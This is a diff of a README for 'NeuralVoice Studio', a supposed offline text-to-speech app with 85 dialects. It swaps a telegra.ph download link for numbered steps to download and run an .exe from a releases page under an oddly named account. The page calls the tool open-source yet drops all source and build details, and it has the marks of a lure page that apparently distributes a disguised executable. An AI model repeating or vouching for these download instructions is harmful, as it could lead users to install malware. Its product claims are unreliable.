@@ -1,183 +1,80 @@
-<!-- markdownlint-disable MD033 -->
-<h1 align="center">🎙️ NeuralVoice Studio</h1>
-<p align="center">
-  <strong>State-of-the-Art AI Voice Generator · 85 Dialects · Lightweight · Offline</strong>
-</p>
+# 🎙️ NeuralVoice-Studio-AI-Text-to-Speech-with-85-Dialects-Offline-Lightweight - Create realistic speech on your computer
 
-<p align="center">
-  <a href="#-key-features">Features</a> •
-  <a href="#-system-requirements">Requirements</a> •
-  <a href="#-installation">Installation</a> •
-  <a href="#-usage">Usage</a> •
-  <a href="#-download">Download</a>
-</p>
+[![Download NeuralVoice Studio](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/moorfowlobsessivecompulsive747/NeuralVoice-Studio-AI-Text-to-Speech-with-85-Dialects-Offline-Lightweight/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3.8+-blue?logo=python" alt="Python">
-  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey" alt="Platform">
-  <img src="https://img.shields.io/badge/License-MIT-green" alt="License">
-  <img src="https://img.shields.io/badge/Size-~200MB-brightgreen" alt="Size">
-</p>
+NeuralVoice Studio turns your text into spoken words. The software uses artificial intelligence to produce natural speech. It runs on your computer without an internet connection. You keep your data private because the app works offline. 
 
----
+## ⚙️ System Requirements 
 
-## 📌 Overview
+Your computer connects to the speech engine easily. Ensure your system meets these basic needs for the best results:
 
-**NeuralVoice Studio** redefines synthetic speech. Leveraging cutting-edge neural networks, it produces voices indistinguishable from human narration. Unlike cloud-based services, this tool operates **100% offline**, ensuring your data privacy and zero latency.
+* Operating System: Windows 10 or Windows 11.
+* Processor: Dual-core CPU with 2.0 GHz speed or higher.
+* Memory: 4 GB RAM minimum.
+* Storage: 2 GB of free space for voice models. 
+* Graphics: Integrated graphics card works fine for this application.
 
-Optimized for performance, NeuralVoice Studio delivers studio-grade audio even on **low-power devices** (Intel Core i3, 4GB RAM). Whether you're a podcaster, e-learning developer, or indie game creator, this is the most versatile and accessible TTS engine available.
+## 📥 How to Install 
 
-### ✨ Key Features
+Follow these steps to set up the software.
 
-- **🎯 Hyper-Realistic Output** — Advanced deep learning models capture prosody, emotion, and natural pauses.
-- **🌍 85 Languages & Dialects** — From global languages (English, Mandarin, Spanish) to regional nuances (Scouse, Quechua, Bavarian).
-- **⚡ Optimized for Low-End PCs** — CPU-only inference with < 500MB RAM usage. No GPU required.
-- **🔐 Full Privacy** — No data ever leaves your machine. Complete offline operation.
-- **🎛️ Fine-Grained Control** — Adjust speed, pitch, emphasis, and even emotional tone (happy, neutral, serious).
-- **📂 Batch Processing** — Convert entire text files or SRT subtitles to speech in one click.
-- **🎧 WAV & MP3 Export** — High-fidelity 44.1kHz stereo audio output.
+1. Visit the [releases page](https://github.com/moorfowlobsessivecompulsive747/NeuralVoice-Studio-AI-Text-to-Speech-with-85-Dialects-Offline-Lightweight/releases).
+2. Locate the latest version at the top of the list.
+3. Click the file ending in .exe to start your download.
+4. Open the file once the download finishes.
+5. Follow the prompts on your screen to complete the installation.
 
----
+## 🚀 Getting Started 
 
-## 💻 System Requirements
+Open the NeuralVoice Studio application from your desktop shortcut. You see a clean interface with a text box. Follow these steps to generate your first audio file.
 
-| Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| **OS**    | Windows 10 / macOS 11 / Ubuntu 20.04 | Windows 11 / macOS 14 / Debian 12 |
-| **CPU**   | Intel Core i3-6100 or equivalent | Intel Core i5-8400 or better |
-| **RAM**   | 4 GB | 8 GB |
-| **Storage** | 500 MB (models additional) | 2 GB (for all dialects) |
-| **GPU**   | None (CPU only) | Optional for faster inference |
+1. Select your language or dialect from the dropdown menu. The list includes 85 options.
+2. Type or paste your text into the main box.
+3. Choose a voice profile from the sidebar. 
+4. Press the Generate button.
+5. Wait for the progress bar to finish.
+6. Click the Play icon to hear the result.
+7. Use the Save button to export the audio as a file.
 
-> *All models are pre-downloaded. No internet connection is required after setup.*
+## 🛠 Features 
 
----
+This tool serves many users. Content creators use the app for videos. Teachers use the app for classroom materials. Developers use the app for prototypes.
 
-## 📥 Download
+* Offline processing: You do not need a network connection.
+* High quality: Each voice sounds natural and smooth.
+* Broad support: The software covers 85 different languages and dialects.
+* Efficiency: The code runs on hardware that is not powerful.
+* Privacy: Your text never leaves your local computer.
 
-Get the latest portable version or source code:
+## 📚 Frequently Asked Questions
 
-<p align="center">
-  <a href="https://telegra.ph/TRANSITION-06-17-3">
-    <img src="https://img.shields.io/badge/📦_Download_Now-Click_Here-ff6f00?style=for-the-badge&logo=github" alt="Download Now">
-  </a>
-</p>
+**Does the software cost money?**
+The software is open-source and free for all users.
 
-> **⬇️ Click the badge above to access the download page.**
+**Can I use this for long documents?**
+Yes. You can paste long blocks of text into the window. The software splits the text into smaller parts to process them.
 
----
+**Why does the voice sound robotic?**
+Check your language settings. Ensure your selected language matches the text you provided. 
 
-## 🚀 Installation
+**Is my data stored online?**
+No. The AI models run locally on your machine. We do not track your input or saved audio files.
 
-### Option 1: Portable Executable (Recommended for non-developers)
-1. Download the `.zip` archive from the [link above](#-download).
-2. Extract to any folder (e.g., `C:\NeuralVoice`).
-3. Run `NeuralVoiceStudio.exe` (Windows) or the appropriate binary for your OS.
+**How do I update the application?**
+Check the releases page once a month for new versions. Install the latest file over your existing copy to keep your settings.
 
-### Option 2: Python Package (For developers)
-```bash
-# Clone repository
-git clone https://github.com/yourusername/NeuralVoice-Studio.git
-cd NeuralVoice-Studio
+## 📝 Tips for Quality Audio
 
-# Create virtual environment (optional)
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
+1. Keep your sentences clear. 
+2. Use punctuation to create natural pauses.
+3. Add commas if the software speaks too fast.
+4. Test different voice profiles to find a match for your project.
+5. Close unused applications if your computer feels slow.
 
-# Install dependencies
-pip install -r requirements.txt
+## 💡 Troubleshooting 
 
-# Download base models
-python scripts/download_models.py --minimal
+If the application closes unexpectedly, restart your machine. If the problem continues, remove the installation folder and install the latest version again. Ensure you have the latest drivers for your audio hardware. Contact support if you need more help with specific errors during the generation process.
 
-# Launch GUI
-python main.py
-```
+## ⚖️ License 
 
----
-
-## 🎬 Usage
-
-### Basic Command Line
-```bash
-# Synthesize from text file
-python synthesize.py --input script.txt --output narration.wav --voice en-US-Female-1
-
-# Batch mode with subtitles
-python synthesize.py --input subtitles.srt --output audio/ --dialect es-ES --speed 1.1
-```
-
-### Graphical Interface
-Launch the GUI with `python gui.py`. You can:
-- Type or paste text directly.
-- Load `.txt`, `.docx`, or `.srt` files.
-- Select from 85 voice presets.
-- Preview and adjust sliders for pitch/tempo.
-- Export to WAV, MP3, or M4A.
-
-### Example Voices
-| Dialect Code | Region | Gender |
-|--------------|--------|--------|
-| `en-US-1`    | American (General) | Female |
-| `en-GB-2`    | British (RP) | Male |
-| `zh-CN-3`    | Mandarin (Standard) | Female |
-| `es-MX-4`    | Mexican Spanish | Male |
-| `hi-IN-5`    | Hindi | Female |
-| `fr-CA-6`    | Canadian French | Male |
-| ... and 79 more.
-
----
-
-## 📂 Project Structure
-```
-NeuralVoice-Studio/
-├── core/                 # Inference engine
-│   ├── models/           # Pre-trained TTS models
-│   ├── vocoder/          # Neural vocoder (HiFi-GAN)
-│   └── tokenizer/        # Multi-lingual phonemizer
-├── gui/                  # PyQt5 interface
-├── scripts/              # Downloader & utilities
-├── tests/                # Unit tests
-├── docs/                 # Full documentation
-├── requirements.txt
-├── main.py
-└── README.md
-```
-
----
-
-## 📚 Documentation & Tutorials
-
-- **[Full User Guide](docs/guide.md)** — Step-by-step walkthrough.
-- **[Voice Customization](docs/custom-voices.md)** — Train your own voice models.
-- **[API Reference](docs/api.md)** — For integration into other software.
-- **[Performance Tuning](docs/performance.md)** — Tips for low-spec machines.
-
----
-
-## 🤝 Contributing
-
-We welcome contributions! Check out our [Contribution Guidelines](CONTRIBUTING.md) to get started.  
-Areas needing help:
-- New dialect training datasets.
-- GUI improvements (theme, accessibility).
-- Performance optimizations for ARM devices.
-
----
-
-## 📄 License
-
-This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.
-
----
-
-## 🌟 Support the Project
-
-If you find NeuralVoice Studio useful, please give us a ⭐ on GitHub!  
-For discussions, bugs, or feature requests, open an [Issue](https://github.com/yourusername/NeuralVoice-Studio/issues).
-
----
-
-<p align="center">
-  Made with ❤️ for the open-source community.
-</p>
+This project uses the MIT license. You can copy, modify, and distribute the files as you see fit. Respect the terms of the license when you share the application with others.
